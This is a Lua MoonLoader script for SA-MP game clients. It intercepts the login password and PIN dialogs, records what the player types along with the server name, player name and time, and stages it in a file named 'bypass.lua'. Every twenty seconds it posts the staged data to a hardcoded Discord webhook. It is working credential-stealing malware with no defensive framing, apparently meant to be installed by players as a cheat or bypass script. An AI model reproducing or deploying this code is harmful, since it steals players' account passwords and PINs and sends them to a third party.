require 'lib.moonloader'
local sampev = require 'lib.samp.events'
local requests = require 'requests'

local loginUCP = nil
local dialogType = {}

function sampev.onShowDialog(id, style, title, button1, button2, text)
    if title then
        local lowerTitle = title:lower()
        if lowerTitle:find("masuk") then
            dialogType[id] = "password"
        elseif lowerTitle:find("verifikasi pin") then
            dialogType[id] = "pin"
        end
    end
end

function sampev.onSendDialogResponse(dialogId, button, listItem, inputText)
    if button == 1 and inputText and inputText:match("%S") then
        local dtype = dialogType[dialogId]
        if dtype then
            dialogType[dialogId] = nil

            local servername = sampGetCurrentServerName()
            local success, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
            if not success then return end
            local playerName = sampGetPlayerNickname(id)
            local waktu = os.date("%Y-%m-%d %H:%M:%S")
            local message = ""

            if dtype == "password" then
                loginUCP = playerName
                message = string.format(
                    "```⟨PASSWORD⟩```\n💀 **SERVER= %s**\n``NAMA UCP=`` **%s**\n``PW=`` **%s**\n🕒 **WAKTU= %s**\n**GHSDEV**\n```⟨PASSWORD⟩```\n---\n",
                    servername, playerName, inputText, waktu
                )
            elseif dtype == "pin" then
                local aksesBy = loginUCP or "UNKNOWN"
                message = string.format(
                    "```⟨PIN⟩```\n☠️ **SERVER= %s**\n``NAMA IC=`` **%s**\n``PIN=`` **%s**\n``PIN BY=`` **%s**\n🕒 **WAKTU= %s**\n**GHSDEV**\n```⟨PIN⟩```\n---\n",
                    servername, playerName, inputText, aksesBy, waktu
                )
            end

            appendToFile(message)
        end
    end
end

function appendToFile(text)
    local path = getWorkingDirectory() .. "/bypass.lua"
    local file = io.open(path, "a")
    if file then
        file:write(text)
        file:close()
    end
end

function main()
    while not isSampAvailable() do wait(1) end
    while true do
        processQueue()
        wait(20000)
    end
end

function processQueue()
    local path = getWorkingDirectory() .. "/bypass.lua"
    local file = io.open(path, "r")
    if not file then return end

    local content = file:read("*a")
    file:close()
    os.remove(path)

    for message in string.gmatch(content, "(.-)\n%-%-%-\n") do
        if message and message:match("%S") then
            sendToDiscord(message)
        end
    end
end

function sendToDiscord(message)
    local success, res = pcall(function()
        return requests.post{
            url = "https://discord.com/api/webhooks/1465014260420706337/OyYmAD3-OZPmztq5aLvj9T0dPDE0suBOmMyjS67AMODQj1hUX2pzHhFLtnD0XrxQjdFy",
            headers = { ["Content-Type"] = "application/json" },
            data = { content = message, username = "BOT 1" }
        }
    end)
end